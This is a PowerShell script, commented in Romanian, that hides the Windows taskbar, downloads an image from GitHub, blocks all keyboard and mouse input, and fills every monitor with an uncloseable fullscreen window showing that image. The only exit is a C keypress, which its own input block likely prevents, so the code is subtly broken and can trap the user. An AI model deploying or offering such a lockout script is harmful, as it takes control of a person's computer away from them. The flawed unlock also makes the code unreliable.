Add-Type -AssemblyName System.Windows.Forms
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class InputBlocker {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
}
"@
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class TaskbarHider {
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

# Ascunde taskbar
$hWnd = [TaskbarHider]::FindWindow("Shell_TrayWnd", "")
[TaskbarHider]::ShowWindow($hWnd, 0)

# Descarcă poza dacă nu există
$tempImage = "$env:TEMP\poza_laptop.jpg"
if (-not (Test-Path $tempImage)) {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $tempImage
}

# Blochează input
[InputBlocker]::BlockInput($true)

# Lista ferestrelor pentru fiecare monitor
$forms = @()

# Creați câte o fereastră per ecran
[System.Windows.Forms.Screen]::AllScreens | ForEach-Object {
    $screen = $_

    $form = New-Object Windows.Forms.Form
    $form.StartPosition = 'Manual'
    $form.Bounds = $screen.Bounds
    $form.FormBorderStyle = 'None'
    $form.TopMost = $true
    $form.BackColor = 'Black'
    $form.KeyPreview = $true
    $form.ShowInTaskbar = $false
    $form.Cursor = [System.Windows.Forms.Cursors]::None

    $pictureBox = New-Object Windows.Forms.PictureBox
    $pictureBox.ImageLocation = $tempImage
    $pictureBox.SizeMode = 'Zoom'
    $pictureBox.Dock = 'Fill'
    $form.Controls.Add($pictureBox)

    # Închidere doar cu C
    $form.Add_KeyDown({
        if ($_.KeyCode -eq 'C') {
            foreach ($f in $forms) {
                $f.Close()
            }

            [TaskbarHider]::ShowWindow($hWnd, 1)
            [InputBlocker]::BlockInput($false)
        }
    })

    # Previi Alt+F4 (parțial)
    $form.Add_FormClosing({
        if ($_.CloseReason -eq "UserClosing") {
            $_.Cancel = $true
        }
    })

    $forms += $form
}

# Afișează toate ferestrele
foreach ($f in $forms) {
    $null = $f.Show()
}

# Run loop pe prima fereastră
[System.Windows.Forms.Application]::Run($forms[0])
